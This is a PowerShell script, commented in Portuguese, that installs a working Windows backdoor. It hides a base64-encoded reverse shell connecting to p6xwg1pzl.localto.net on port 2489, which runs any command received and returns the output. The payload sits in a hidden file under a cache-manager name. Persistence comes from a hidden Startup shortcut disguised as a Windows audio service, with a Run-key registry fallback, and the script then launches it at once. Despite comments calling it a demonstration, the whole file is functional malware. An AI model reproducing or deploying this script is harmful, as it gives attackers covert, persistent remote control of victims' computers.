


# Script corrigido - versão otimizada e funcional
# Removida a tarefa agendada das 3h conforme solicitado

# 1. Pastas de trabalho
$LogDir = "$env:LOCALAPPDATA\Microsoft\Windows\DeviceMetadataCache"
$TempDir = "$env:TEMP\Windows\TempLogs"

# Criar diretórios de forma robusta
function Create-HiddenDirectory {
    param([string]$Path)
    
    try {
        # Criar diretório se não existir
        if (-not (Test-Path $Path)) {
            New-Item -ItemType Directory -Path $Path -Force -ErrorAction Stop | Out-Null
            Write-Host "Diretório criado: $Path" -ForegroundColor Green
        }
        
        # Tornar oculto (apenas Hidden, não System para evitar problemas)
        $item = Get-Item $Path -Force -ErrorAction Stop
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Host "Atributos definidos para $Path" -ForegroundColor Green
        
        return $true
    }
    catch {
        Write-Host "Erro ao criar/ocultar $Path : $_" -ForegroundColor Red
        return $false
    }
}

# Criar os diretórios necessários
$directoriesCreated = $true
$directoriesCreated = $directoriesCreated -and (Create-HiddenDirectory -Path $LogDir)
$directoriesCreated = $directoriesCreated -and (Create-HiddenDirectory -Path $TempDir)

if (-not $directoriesCreated) {
    Write-Host "Falha ao criar diretórios necessários. Abortando." -ForegroundColor Red
    exit 1
}

# 2. Payload simplificado para demonstração
# NOTA: Este payload é apenas para demonstração técnica
# 2. Payload simples para teste
$Payload = @'
$e='SilentlyContinue';while(1){try{$c=New-Object Net.Sockets.TCPClient('p6xwg1pzl.localto.net',2489);$s=$c.GetStream();$b=New-Object byte[] 1024;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=[Text.Encoding]::ASCII.GetString($b,0,$i);$o=iex $d 2>&1|Out-String;$s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);$s.Flush()}}catch{Start-Sleep -s 5}}
'@


# 3. Script ofuscado de forma mais discreta
$ScriptName = "CacheManager_" + (Get-Date -Format "yyyyMMdd") + ".ps1"
$ScriptPath = Join-Path $LogDir $ScriptName

try {
    # Codificar de forma mais eficiente
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($Payload)
    $encodedPayload = [Convert]::ToBase64String($bytes)
    
    # Criar script com código codificado
    $scriptContent = @"
<# Script de gerenciamento de cache - Gerado automaticamente #>

`$encoded = '$encodedPayload'
try {
    `$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$encoded))
    Invoke-Expression `$decoded
}
catch {
    Write-Error "Falha ao executar script: `$_"
}
"@
    
    $scriptContent | Out-File -FilePath $ScriptPath -Encoding UTF8 -Force
    Write-Host "Script criado em: $ScriptPath" -ForegroundColor Green
    
    # Tornar o arquivo oculto
    $fileItem = Get-Item $ScriptPath -Force
    $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    
} catch {
    Write-Host "Erro ao criar script: $_" -ForegroundColor Red
    exit 1
}

# 4. Persistência apenas via inicialização do usuário (sem tarefa agendada)
Write-Host "Configurando persistência via inicialização..." -ForegroundColor Yellow

try {
    $StartupPath = [System.Environment]::GetFolderPath('Startup')
    
    # Verificar se a pasta Startup existe
    if (-not (Test-Path $StartupPath)) {
        Write-Host "Pasta Startup não encontrada: $StartupPath" -ForegroundColor Red
        exit 1
    }
    
    # Criar atalho na inicialização
    $ShortcutName = "WindowsAudio.lnk"
    $ShortcutPath = Join-Path $StartupPath $ShortcutName
    
    # Usar WScript.Shell para criar atalho
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
    
    # Configurar atalho
    $Shortcut.TargetPath = "powershell.exe"
    $Shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $Shortcut.WindowStyle = 7  # Minimizado
    $Shortcut.Description = "Serviço de Áudio do Windows"
    $Shortcut.WorkingDirectory = $LogDir
    
    $Shortcut.Save()
    Write-Host "Atalho de inicialização criado: $ShortcutPath" -ForegroundColor Green
    
    # Tornar o atalho oculto
    $shortcutItem = Get-Item $ShortcutPath -Force
    $shortcutItem.Attributes = $shortcutItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    
} catch {
    Write-Host "Erro ao configurar inicialização: $_" -ForegroundColor Red
    Write-Host "Tentando método alternativo..." -ForegroundColor Yellow
    
    # Método alternativo: Registro Run
    try {
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsAudioService"
        $regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
        Write-Host "Persistência configurada via registro." -ForegroundColor Green
    }
    catch {
        Write-Host "Falha ao configurar persistência via registro: $_" -ForegroundColor Red
    }
}

# 5. Executar o script imediatamente (opcional)
Write-Host "Executando script de demonstração..." -ForegroundColor Yellow
try {
    & powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $ScriptPath
    Write-Host "Script executado com sucesso." -ForegroundColor Green
}
catch {
    Write-Host "Execução inicial falhou, mas persistência foi configurada." -ForegroundColor Yellow
}

# 6. Limpeza e informações
Write-Host "`n=== CONFIGURAÇÃO CONCLUÍDA ===" -ForegroundColor Cyan
Write-Host "Script principal: $ScriptPath" -ForegroundColor White
Write-Host "Persistência: Via inicialização do usuário" -ForegroundColor White
Write-Host "Modo de execução: Oculto (WindowStyle Hidden)" -ForegroundColor White
Write-Host "`nO script será executado automaticamente no próximo login." -ForegroundColor Cyan
